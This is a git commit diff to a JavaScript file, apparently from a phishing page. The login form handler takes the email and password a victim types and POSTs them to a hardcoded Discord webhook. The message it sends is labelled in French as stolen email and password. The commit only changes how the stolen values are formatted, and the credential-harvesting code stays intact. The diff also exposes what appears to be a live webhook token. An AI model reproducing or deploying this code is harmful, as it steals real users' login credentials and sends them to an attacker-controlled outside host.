0c84fb861be464707920aec644785fb6ecf81a41
Idk0712 <132455294+Idk0712@users.noreply.github.com>
2023-05-08 22:53:15 +0200

    Update main.js

--- main.js
+++ main.js
@@ -10,7 +10,7 @@ form.addEventListener('submit', async (event) => {
   const password = formData.get('password');
   const webhookUrl = 'https://discord.com/api/webhooks/1103319312900567192/3SWoHjepeUxQEShb8Y2SFO-DJZNED1Cu6z49g6RT0_Z_6Zref4z5_0rYWQ4X9zvoilZN';
   const payload = {
-    content: `Email et mdp voler:\nEmail: ${email}\nMot de passe: ${password}`
+    content: `Email et mdp voler:\nEmail: **__${email}__**\nMot de passe: **__${password}__**`
   };
   await fetch(webhookUrl, {
     method: 'POST',
